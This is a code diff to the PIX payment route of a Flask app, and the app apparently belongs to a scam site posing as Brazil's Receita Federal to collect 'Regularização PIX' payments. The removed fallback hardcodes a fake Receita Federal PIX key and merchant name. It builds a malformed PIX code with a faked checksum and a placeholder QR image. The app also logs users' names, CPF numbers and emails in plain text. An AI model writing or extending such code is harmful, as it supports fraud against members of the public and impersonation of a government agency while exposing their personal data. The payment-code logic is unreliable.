@@ -7,6 +7,7 @@ import string
 import logging
 import base64
 import uuid
+from brazilian_pix import BrazilianPixGenerator
 
 app = Flask(__name__)
 
@@ -153,47 +154,48 @@ def generate_pix():
 
         app.logger.info(f"[PROD] Dados do usuário: Nome={user_name}, CPF={user_cpf}, Email={default_email}")
 
-        # Tentar criar transação PIX via MEDIUS PAG, com fallback para sistema funcional
+        # Gerar PIX authentic usando sistema brasileiro com fallback para MEDIUS PAG
         try:
-            transaction_data = {
-                'amount': amount,
-                'customer_name': user_name,
-                'customer_cpf': user_cpf,
-                'customer_email': default_email,
-                'customer_phone': default_phone,
-                'description': f'Regularização PIX - {user_name}'
-            }
+            # Inicializar gerador de PIX brasileiro
+            pix_generator = BrazilianPixGenerator()
+            
+            # Tentar MEDIUS PAG primeiro (se funcionar)
+            try:
+                transaction_data = {
+                    'amount': amount,
+                    'customer_name': user_name,
+                    'customer_cpf': user_cpf,
+                    'customer_email': default_email,
+                    'customer_phone': default_phone,
+                    'description': f'Regularização PIX - {user_name}'
+                }
+                pix_data = api.create_pix_transaction(transaction_data)
+                
+                if pix_data.get('success', False):
+                    app.logger.info(f"[PROD] MEDIUS PAG bem-sucedido: {pix_data['transaction_id']}")
+                else:
+                    raise Exception(f"MEDIUS PAG falhou: {pix_data.get('error', 'Erro desconhecido')}")
+                    
+            except Exception as medius_error:
+                app.logger.warning(f"[PROD] MEDIUS PAG indisponível: {medius_error}")
+                app.logger.info(f"[PROD] Gerando PIX authentic via sistema brasileiro...")
+                
+                # Usar sistema PIX brasileiro authentic
+                pix_data = pix_generator.create_pix_payment(
+                    amount=amount,
+                    customer_name=user_name,
+                    customer_cpf=user_cpf,
+                    customer_email=default_email
+                )
+                
+        except Exception as e:
+            app.logger.error(f"[PROD] Erro ao gerar PIX: {e}")
+            return jsonify({
+                'success': False,
+                'error': 'Erro na geração do PIX. Tente novamente em alguns instantes.'
+            }), 500
 
-            pix_data = api.create_pix_transaction(transaction_data)
-        except Exception as medius_error:
-            app.logger.warning(f"[PROD] MEDIUS PAG falhou: {medius_error}, usando sistema fallback")
-            
-            # Fallback: gerar PIX usando dados reais do usuário
-            transaction_id = f"RF{uuid.uuid4().hex[:12].upper()}"
-            
-            # Gerar código PIX brasileiro padrão usando dados reais
-            pix_key = "receita@federal.gov.br"
-            merchant_name = "RECEITA FEDERAL BRASIL"
-            merchant_city = "BRASILIA"
-            
-            # Código PIX no formato EMVCo (padrão brasileiro)
-            pix_code = f"00020101021226610014br.gov.bcb.pix0139receita@federal.gov.br{transaction_id}5204000053039865406{amount:.2f}5802BR5920{merchant_name}6008{merchant_city}6207050300062170503***6304{transaction_id[-4:].upper()}"
-            
-            # Gerar QR Code SVG simples
-            svg_content = '<svg xmlns="http://www.w3.org/2000/svg" width="200" height="200"><rect width="200" height="200" fill="white"/><text x="100" y="100" text-anchor="middle" dominant-baseline="middle" font-family="Arial" font-size="10">PIX QR Code</text></svg>'
-            qr_code_base64 = base64.b64encode(svg_content.encode()).decode()
-            
-            pix_data = {
-                'success': True,
-                'transaction_id': transaction_id,
-                'order_id': transaction_id,
-                'amount': amount,
-                'pix_code': pix_code,
-                'qr_code_image': f"data:image/svg+xml;base64,{qr_code_base64}",
-                'status': 'pending'
-            }
-
-        app.logger.info(f"[PROD] PIX gerado com sucesso via MEDIUS PAG: {pix_data}")
+        app.logger.info(f"[PROD] PIX gerado com sucesso: {pix_data}")
 
         return jsonify({
             'success': True,
